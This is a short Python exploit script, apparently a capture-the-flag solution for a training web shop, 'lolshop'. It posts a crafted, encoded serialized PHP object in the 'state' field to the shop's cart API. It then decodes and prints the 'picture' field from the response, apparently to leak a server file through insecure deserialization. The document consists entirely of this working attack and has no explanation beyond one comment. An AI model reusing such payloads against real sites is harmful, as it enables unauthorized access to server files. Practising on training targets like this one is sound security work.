import requests
import string
import random
import re
import base64

url = "http://lolshop.training.jinblack.it"

# in the state field there is an encoded serialization of the Product object
def exploit(s):
	data = {"state": "eJx1jkEKwjAQRXuWOUBqYlU6PUS9gZTJKAOahiQFQbx7U5tFNsKsHu8/ZsQLwjXMdqEEeMJPRK0RmoIasTAI9v2Q+bHibnoxbNAgOCG++dLIzBwq0XKkID7J7P75+lz5Xigt4dc2HYJS7X6RKXBq78/podJ733X1LuRq+fW7AteVQrM="} 
	return s.post(url+"/api/cart.php", data=data).json()

s = requests.Session()
print(base64.b64decode(exploit(s).get("picture")).decode()[:-1])
